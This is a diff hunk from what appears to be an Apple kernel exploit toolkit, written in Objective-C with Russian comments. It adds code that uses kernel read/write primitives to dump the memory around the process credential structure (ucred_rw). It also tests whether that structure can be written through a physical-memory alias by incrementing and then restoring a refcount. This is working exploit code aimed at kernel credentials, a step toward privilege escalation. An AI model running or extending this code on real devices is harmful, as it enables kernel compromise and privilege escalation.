@@ -7982,6 +7982,32 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     for (int i = 0; i < 16; i++)
                         [dd appendFormat:@" +%x:%#018llx", i * 8, (unsigned long long)early_kread64(ucRW + (uint64_t)i * 8)];
                     kpNote(r, [NSString stringWithFormat:@"  [UCRW-PROBE] контент ucred_rw:%@", dd]);
+                    // 2.0.23: объект по ucred_rw+0x10 — кандидат на posix_cred-зеркало
+                    uint64_t rw10 = kp_untag_ptr(early_kread64(ucRW + 0x10));
+                    if (kpLooksLikeKernelPointer(rw10)) {
+                        uint64_t r10pa = kvtophys(rw10 & ~0x3fffULL);
+                        int r10t = r10pa ? kpFrameTypeOf(r10pa) : -1;
+                        NSMutableString *d10 = [NSMutableString string];
+                        for (int i = 0; i < 16; i++)
+                            [d10 appendFormat:@" +%x:%#018llx", i * 8, (unsigned long long)early_kread64(rw10 + (uint64_t)i * 8)];
+                        kpNote(r, [NSString stringWithFormat:@"  [UCRW-PROBE] ucred_rw+0x10 → %#llx pagePA=%#llx тип=%d:%@",
+                                  (unsigned long long)rw10, (unsigned long long)r10pa, r10t, d10]);
+                    }
+                    // 2.0.23: тест записи типа 0x21 — refcount 0x42 → 0x43 → restore.
+                    // Маркер безопасен (возвращаем сразу), результат = пишется ли тип.
+                    if (ucRWpa && rwT == 0x21) {
+                        uint64_t aliasRW = phystokv(ucRWpa);
+                        if (aliasRW) {
+                            uint64_t ref0 = early_kread64(ucRW + 0x00);
+                            early_kwrite64(aliasRW + (ucRW & 0x3fff), ref0 + 1);
+                            uint64_t ref1 = early_kread64(ucRW + 0x00);
+                            early_kwrite64(aliasRW + (ucRW & 0x3fff), ref0);
+                            uint64_t ref2 = early_kread64(ucRW + 0x00);
+                            kpNote(r, [NSString stringWithFormat:@"  [UCRW-PROBE] тест записи тип=0x21: было=%#llx после+1=%#llx после-restore=%#llx → %@",
+                                      (unsigned long long)ref0, (unsigned long long)ref1, (unsigned long long)ref2,
+                                      ref1 == ref0 + 1 ? @"ПИШЕТСЯ ★★" : @"не пишется"]);
+                        }
+                    }
                 }
                 uint64_t ucLb = kp_untag_ptr(early_kread64(ucF + 0x78));
                 if (kpLooksLikeKernelPointer(ucLb)) {
